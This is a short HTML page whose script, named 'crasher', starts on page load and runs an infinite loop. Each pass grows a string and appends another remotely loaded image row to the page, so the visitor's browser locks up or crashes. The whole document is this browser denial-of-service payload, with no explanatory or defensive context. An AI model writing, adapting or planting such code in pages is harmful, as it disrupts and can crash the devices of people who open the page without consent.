<body id onload="crasher()"></body>
<table id="123">
</table>
    

<script> 
a = "a"
b = true
function crasher() { 
    while (1) {
        a += "a"

        document.getElementById('123').innerHTML += "<tr><td><img src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8HzxQ4J6inkbz19qQaVoWBMyjl9hhVbWdJ-eZmiVm3A&s'></td></tr>"

        if (b == true) {
            console.log('boom')
            b = false
        }
        else {
            console.log('bam')
            b = true
        }
    }
}
</script> 